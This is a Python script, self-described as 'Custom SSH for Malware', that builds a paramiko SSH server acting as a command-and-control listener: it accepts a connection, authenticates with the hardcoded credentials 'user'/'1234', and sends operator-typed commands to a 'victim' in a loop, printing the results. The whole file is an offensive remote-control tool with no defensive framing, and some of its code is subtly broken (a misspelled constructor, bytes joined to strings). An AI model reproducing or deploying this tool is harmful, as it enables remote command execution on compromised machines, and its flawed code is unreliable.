import socket
import paramiko
import threading
import sys
import getpass
"""
Custom SSH for Malware Although we already have a custom command execution i dunno man im fucked up ......***....... 

$ ssh-keygen 
make a rsa key

put the full path in hostkey e.g /home/user/.ssh/id_rsa.key

"""
# entered_password = getpass.getpass()

host_key = paramiko.RSAKey(filename='/home/user/.ssh/id_rsa.key')

class Server (paramiko.ServerInterface):
   """
   Server Side Custom SSH with command execution
   """
   def _init_(self):
       self.event = threading.Event()

   def check_channel_request(self, kind, chanid):
       if kind == 'session':
           return paramiko.OPEN_SUCCEEDED
       return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
   
   def check_auth_password(self, username, password):
       if (username == "user") and (password == "1234"):
           return paramiko.AUTH_SUCCESSFUL
       return paramiko.AUTH_FAILED

try:
    ip = input("ip of victim")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((ip, 22))
    sock.listen(100)
    print ('[*] Listening for connection ...')
    client, addr = sock.accept()
except Exception as  e:
    print(f'[-] Connection failed: {e}') 
    sys.exit(1)
print (f'[+] Got a connection! >>> {ip}')

try:
    t = paramiko.Transport(client)
    try:
        t.load_server_moduli()
    except Exception:
        print('[-] Failed to load moduli')
    t.add_server_key(host_key)
    server = Server()
    try:
        t.start_server(server=server)
    except paramiko.SSHException:
        print ('[-] SSH negotiation failed.')

    chan = t.accept(20)
    print ('[+] Authenticated!')
    print (chan.recv(1024))
    while True:
        command= input("Enter command: ").strip('\n')
        chan.send(command)
        print (chan.recv(1024) + '\n')

except Exception as e:
    print (f'[-] Failed: {e}' )
    try:
        t.close()
    except Exception:
        pass
    sys.exit(1)
